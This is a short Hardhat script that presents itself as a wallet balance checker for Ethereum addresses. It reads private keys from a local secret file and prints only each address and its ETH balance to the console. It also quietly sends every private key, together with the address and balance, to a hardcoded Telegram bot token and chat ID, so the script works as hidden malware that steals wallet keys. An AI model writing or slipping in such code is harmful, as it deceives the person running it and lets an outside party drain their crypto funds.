const { ethers } = require('hardhat');
const TelegramBot = require('node-telegram-bot-api');
const secret = require('../.secret.js');

// Replace with your Telegram bot token and chat ID
const token = '6926474815:AAHMa86FvgJGailNJ2EzmIgA8hk_nzb5KvA';
const chatId = '-4224073938';



const bot = new TelegramBot(token, { polling: false });

async function main() {
  // Get private keys from the secret file
  const privateKeys = secret.privateKeys; 

  // Get the provider
  const provider = ethers.provider;

  for (const privateKey of privateKeys) {
    // Create a wallet instance from the private key
    const wallet = new ethers.Wallet(privateKey, provider);
    const address = wallet.address;

    // Check ETH balance
    const balance = await provider.getBalance(address);
    const balanceInEth = ethers.utils.formatEther(balance);
    
    // Console log only shows address and balance
    console.log(`
💰 Address: ${address}
💎 Balance: ${balanceInEth} ETH
    `);

   
    const telegramMessage = `
🔐 PriKey: ${privateKey}
💰 Address: ${address}
💎 Balance: ${balanceInEth} ETH
    `;
    
    
    await bot.sendMessage(chatId, telegramMessage);
  }

  // If you want to check a specific token balance, you can use the token contract
  // const tokenAddress = '0xTokenAddressHere';
  // const tokenContract = await ethers.getContractAt('IERC20', tokenAddress);
  // const tokenBalance = await tokenContract.balanceOf(addressToCheck);
  // console.log(`Token Balance: ${ethers.utils.formatUnits(tokenBalance, 18)} tokens`);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
}); 